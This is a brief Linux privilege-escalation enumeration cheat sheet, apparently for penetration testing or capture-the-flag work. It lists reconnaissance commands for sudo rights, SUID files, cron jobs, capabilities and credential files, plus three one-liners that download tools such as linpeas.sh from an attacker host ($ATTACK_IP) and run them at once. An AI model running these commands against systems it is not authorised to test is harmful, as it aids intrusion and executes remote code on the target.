# Linux PrivEsc Enumeration

## Quick Checks (Always Run First)
```bash
# System info
uname -a
cat /etc/os-release
hostnamectl

# User info
id
whoami
sudo -l
cat /etc/passwd | grep -v nologin
ls -la /home/
history

# Network
ip a
ip route
cat /etc/hosts
ss -tulpn

# Processes
ps aux | grep root
top -n 1

# File system
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -writable -type f 2>/dev/null      # Writable files

# Cron
cat /etc/crontab
ls -la /etc/cron*
```

## Automated Scripts
```bash
wget http://$ATTACK_IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
wget http://$ATTACK_IP/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
wget http://$ATTACK_IP/pspy64 && chmod +x pspy64 && ./pspy64
```

## Quick Wins Checklist
1. `sudo -l` - Check sudo permissions
2. `find / -perm -4000 2>/dev/null` - SUID binaries
3. `cat /etc/crontab` - Cron jobs
4. `getcap -r / 2>/dev/null` - Capabilities
5. `ls -la /etc/passwd /etc/shadow` - File perms
6. `history` - Bash history
7. `./linpeas.sh` - Auto-enumeration
